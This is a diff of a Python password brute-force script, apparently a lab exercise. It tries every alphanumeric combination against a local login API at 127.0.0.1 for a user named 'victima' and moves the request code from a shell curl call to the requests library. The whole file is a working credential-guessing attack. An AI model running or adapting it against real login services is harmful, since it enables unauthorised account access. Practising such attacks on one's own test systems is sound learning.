@@ -1,40 +1,41 @@
 import time
-import subprocess
 import itertools
+import requests
 
-# Usuario fijo
 usuario_fijo = "victima" 
+url_base = "http://127.0.0.1:8000/login"
+
 def send_request(password):
-        # Construimos el comando curl
-    command = f'curl -s -X POST "http://127.0.0.1:8000/login?nombre_usuario={usuario_fijo}&contrase={password}"'
+    # Como definimos los campos como parámetros en la API,
+    # los enviamos a través de la URL (params)
+    parametros = {
+        "username": usuario_fijo,
+        "password": password
+    }
+    
     try:
-        # Ejecutamos el curl y capturamos la respuesta
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        return result.stdout.strip()
+        # Enviamos la petición POST con los parámetros en la URL
+        response = requests.post(url_base, params=parametros)
+        return response.text
     except Exception:
         return ""
-
 def main():
-    # Alfabeto para las pruebas
-    alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-    max_len_password = 6
+    alfabeto = "abcdefghijklmnopqrstuvwxyz0123456789"
+    max_len = 4
     intentos = 0
-    tiempo_inicio = time.time()
-
-    for len_pass in range(1, max_len_password + 1):
-        for pass_tuple in itertools.product(alfabeto, repeat=len_pass):
+    inicio = time.time()
+    for l in range(1, max_len + 1):
+        for combo in itertools.product(alfabeto, repeat=l):
             intentos += 1
-            password_generada = "".join(pass_tuple)
+            clave = "".join(combo)
+            respuesta = send_request(clave)
             
-            # Enviamos el intento 
-            respuesta = send_request(password_generada)
-            
-            # Buscamos si la respuesta contiene el mensaje de éxito
+            # Verificamos la respuesta de la API
             if "Login exitoso" in respuesta:
-                tiempo_fin = time.time()
-                print(f"CONTRASEÑA ENCONTRADA: {password_generada}")
-                print(f"Intentos totales: {intentos}")
-                print(f"Tiempo: {tiempo_fin - tiempo_inicio:.2f} segundos")
+                fin = time.time()
+                
+                print(f"CLAVE ENCONTRADA {clave}")
+                print(f"Intentos: {intentos}  Tiempo: {fin - inicio:.2f}s")
                 return
 if __name__ == "__main__":
     main()
